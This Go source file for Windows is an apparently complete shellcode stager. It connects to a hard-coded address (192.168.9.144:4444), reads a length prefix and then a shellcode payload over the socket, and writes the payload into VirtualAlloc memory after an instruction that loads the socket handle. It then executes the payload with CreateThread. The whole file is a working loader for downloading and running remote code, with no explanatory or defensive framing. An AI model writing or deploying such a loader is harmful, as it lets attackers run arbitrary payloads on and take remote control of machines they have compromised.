package main

import (
	"encoding/binary"
	"fmt"
	"github.com/b00stfr3ak/w32"
	"log"
	"syscall"
	"unsafe"
)

func main() {
	var d syscall.WSAData
	syscall.WSAStartup(uint32(0x202), &d)
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := syscall.SockaddrInet4{Port: 4444, Addr: [4]byte{192, 168, 9, 144}}
	syscall.Connect(fd, &addr)
	fmt.Println("Connected to server")
	var buf [4]byte
	dataBuf := syscall.WSABuf{Len: uint32(4), Buf: &buf[0]}
	flags := uint32(0)
	qty := uint32(0)
	syscall.WSARecv(fd, &dataBuf, 1, &qty, &flags, nil, nil)
	scLength := binary.LittleEndian.Uint32(buf[:])
	fmt.Println("shellcode length is ", scLength)
	sc := make([]byte, scLength)
	var sc2 []byte
	dataBuf = syscall.WSABuf{Len: scLength, Buf: &sc[0]}
	flags2 := uint32(0)
	qty2 := uint32(0)
	total := uint32(0)
	for total < scLength {
		syscall.WSARecv(fd, &dataBuf, 1, &qty2, &flags2, nil, nil)
		for i := 0; i < int(qty2); i++ {
			sc2 = append(sc2, sc[i])
		}
		total += qty2
	}
	mem, err := win32.VirtualAlloc(uintptr(scLength + 5))
	if err != nil {
		log.Fatalf("Can't create buffer %s", err)
	}
	fmt.Println("Created buffer")
	b := (*[800000]byte)(unsafe.Pointer(mem))
	fmt.Println("Created byte array to virtualalloc")
	m := (uintptr)(unsafe.Pointer(fd))
	b[0] = 0xBF
	b[1] = byte(m)
	b[2] = 0x00
	b[3] = 0x00
	b[4] = 0x00
	for x, s := range sc2 {
		b[x+5] = s
	}
	fmt.Println("wrote shellcode to buffer")
	//syscall.Syscall(mem, 0, 0, 0, 0)
	var threadID uint = 0
	hand := win32.CreateThread(0, 0, unsafe.Pointer(mem),
		0, 0, &threadID)
	println("created thread")
	win32.WaitForSingleObject(hand, 0xFFFFFFF)
}
